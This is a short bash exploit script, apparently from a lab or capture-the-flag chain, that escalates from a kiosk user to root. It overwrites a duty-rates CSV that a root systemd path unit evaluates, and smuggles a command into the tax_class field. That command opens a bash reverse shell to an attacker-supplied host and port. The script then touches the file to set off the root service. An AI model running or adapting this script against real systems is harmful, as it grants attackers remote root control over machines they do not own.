#!/usr/bin/env bash
# Run as dutyfree-kiosk (pos-ops). Writes duty-rates.csv; systemd.path eval as root.
#   LHOST=10.10.x.x ROOT_PORT=7777 ./04-csv-root.sh
set -euo pipefail
LHOST="${LHOST:?set LHOST}"
ROOT_PORT="${ROOT_PORT:-7777}"
CSV=/opt/vrs/data/duty-rates.csv

# tax_class is eval'd; duty_pct/vat_pct must be digits; no commas in payload.
cat > "$CSV" <<EOF
SPIRITS,45,20
WINE,25,20
BEER,25,20
SOFT_DRINKS,20,20
SNACKS,20,20
CONFECTIONERY,20,20
WATER,0,0
bash -c "bash -i >& /dev/tcp/${LHOST}/${ROOT_PORT} 0>&1";x,1,0
EOF
sleep 0.2
touch "$CSV"
echo "[*] wrote $CSV — PathModified should start vrs-duty-apply.service"
